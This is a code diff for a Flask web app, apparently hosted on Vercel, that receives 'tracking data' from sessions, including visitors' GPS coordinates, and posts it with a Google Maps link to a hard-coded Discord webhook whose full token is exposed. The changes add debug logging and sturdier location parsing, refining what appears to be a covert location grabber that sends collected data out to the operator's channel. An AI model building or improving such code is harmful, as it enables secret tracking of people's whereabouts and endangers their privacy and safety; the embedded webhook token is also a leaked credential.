@@ -7,41 +7,63 @@ from pathlib import Path
 
 app = Flask(__name__)
 
-# Updated to your new Discord webhook URL
+# Your Discord webhook URL
 DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1536152829444493322/2l-TyMVUKD8Ly2wk-0amSwuTwUeXY_yOltEQT1MMH8OT-d8vzN8UsbAQ7aJK2iSzgy7o"
 
 # Send data to Discord
 def send_to_discord(data):
     """Send collected data to Discord webhook"""
     
+    # --- DEBUG: Log the entire data object ---
+    print("=" * 60)
+    print("FULL DATA RECEIVED FOR DISCORD:")
+    print(json.dumps(data, indent=2))
+    print("=" * 60)
+    
+    # Check specifically for location
+    location = data.get('location', {})
+    print(f"LOCATION DATA: {location}")
+    print(f"Location type: {type(location)}")
+    print(f"Has latitude: {'latitude' in location}")
+    print(f"Has longitude: {'longitude' in location}")
+    
     # Format the data nicely for Discord
     embed = {
         "title": "📍 New Tracking Data Received",
-        "color": 0x5865F2,  # Discord blue
+        "color": 0x5865F2,
         "fields": [],
         "footer": {"text": f"Session: {data.get('sessionId', 'unknown')}"},
         "timestamp": datetime.datetime.utcnow().isoformat()
     }
     
-    # --- FIXED LOCATION SECTION ---
-    # This now correctly extracts and sends location data
-    location = data.get('location', {})
-    if location and isinstance(location, dict) and 'latitude' in location and 'longitude' in location:
-        lat = location.get('latitude', 'N/A')
-        lng = location.get('longitude', 'N/A')
-        accuracy = location.get('accuracy', 'N/A')
-        maps_link = f"https://maps.google.com/?q={lat},{lng}"
+    # --- FIXED: Better location extraction ---
+    # Check if location exists and has coordinates
+    if location and isinstance(location, dict):
+        lat = location.get('latitude')
+        lng = location.get('longitude')
         
-        embed["fields"].append({
-            "name": "📍 Location",
-            "value": f"**Lat/Lng:** {lat}, {lng}\n**Accuracy:** ±{accuracy}m\n[Google Maps]({maps_link})",
-            "inline": False
-        })
+        # Check if coordinates are valid (not None, not 'N/A')
+        if lat is not None and lat != 'N/A' and lng is not None and lng != 'N/A':
+            accuracy = location.get('accuracy', 'N/A')
+            maps_link = f"https://maps.google.com/?q={lat},{lng}"
+            
+            embed["fields"].append({
+                "name": "📍 Location",
+                "value": f"**Lat/Lng:** {lat}, {lng}\n**Accuracy:** ±{accuracy}m\n[Google Maps]({maps_link})",
+                "inline": False
+            })
+        else:
+            # Check if there's an error message
+            error = location.get('error', 'Unknown error')
+            embed["fields"].append({
+                "name": "📍 Location",
+                "value": f"❌ Location not shared\nReason: {error}",
+                "inline": False
+            })
     else:
-        # Clear message if location was not shared or failed
         embed["fields"].append({
             "name": "📍 Location",
-            "value": "❌ Location not shared or unavailable",
+            "value": "❌ No location data received",
             "inline": False
         })
     
@@ -111,6 +133,9 @@ def send_to_discord(data):
     
     try:
         response = requests.post(DISCORD_WEBHOOK, json=payload)
+        print(f"Discord response status: {response.status_code}")
+        if response.status_code != 204:
+            print(f"Discord response: {response.text}")
         return response.status_code == 204
     except Exception as e:
         print(f"Discord send error: {e}")
@@ -147,5 +172,4 @@ def track_data():
 def health():
     return jsonify({"status": "healthy"})
 
-# For Vercel
 app = app
